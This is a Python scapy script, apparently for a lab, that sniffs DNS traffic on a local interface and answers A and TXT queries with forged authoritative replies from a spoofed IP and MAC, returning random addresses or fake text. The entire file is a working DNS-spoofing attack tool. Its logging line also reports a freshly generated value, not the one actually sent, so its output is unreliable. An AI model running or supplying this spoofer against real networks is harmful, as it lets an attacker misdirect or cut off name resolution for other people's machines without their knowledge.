# DNS_server_fake.py
from scapy.all import *
import random

# Configuration
FAKE_IP = "192.168.80.200"  # Spoofed IP address to respond from
FAKE_MAC = "66:55:44:33:22:11"  # Spoofed MAC address
INTERFACE = "ens33"  # Network interface to sniff on (replace with your interface)

def generate_fake_ip():
    """Generate a random fake IP address for A records."""
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def generate_fake_txt():
    """Generate fake TXT record data."""
    return f"fake-data-{random.randint(1000, 9999)}.example.com"

def handle_dns_request(pkt):
    # Check if the packet is a DNS query
    if pkt.haslayer(DNS) and pkt[DNS].qr == 0:  # qr == 0 means it's a query
        dns = pkt[DNS]
        qname = dns.qd.qname.decode()  # Queried domain name
        qtype = dns.qd.qtype  # Query type (1=A, 16=TXT)

        # Handle A or TXT queries
        if qtype == 1 or qtype == 16:
            print(f"Received DNS query for {qname} (Type: {'A' if qtype == 1 else 'TXT'})")

            # Craft Ethernet layer
            eth = Ether(src=FAKE_MAC, dst=pkt[Ether].src)

            # Craft IP layer
            ip = IP(src=FAKE_IP, dst=pkt[IP].src)

            # Craft UDP layer
            udp = UDP(sport=53, dport=pkt[UDP].sport)

            # Craft DNS response
            dns_response = DNS(
                id=dns.id,  # Match the query ID
                qr=1,  # Response flag
                aa=1,  # Authoritative answer
                qd=dns.qd,  # Include original query
                an=[]  # Answer section
            )

            # Add fake answer based on query type
            if qtype == 1:  # A record
                dns_response.an = DNSRR(
                    rrname=qname,
                    type="A",
                    ttl=3600,
                    rdata=generate_fake_ip()
                )
            elif qtype == 16:  # TXT record
                dns_response.an = DNSRR(
                    rrname=qname,
                    type="TXT",
                    ttl=3600,
                    rdata=generate_fake_txt()
                )

            # Build the complete packet
            response_pkt = eth / ip / udp / dns_response

            # Send the response
            sendp(response_pkt, iface=INTERFACE, verbose=0)
            print(f"Sent fake DNS response for {qname}: {'A: ' + generate_fake_ip() if qtype == 1 else 'TXT: ' + generate_fake_txt()}")

def main():
    print(f"Sniffing DNS requests on {INTERFACE}...")
    # Sniff UDP packets on port 53 (DNS)
    sniff(iface=INTERFACE, filter="udp port 53", prn=handle_dns_request, store=0)

if __name__ == "__main__":
    main()
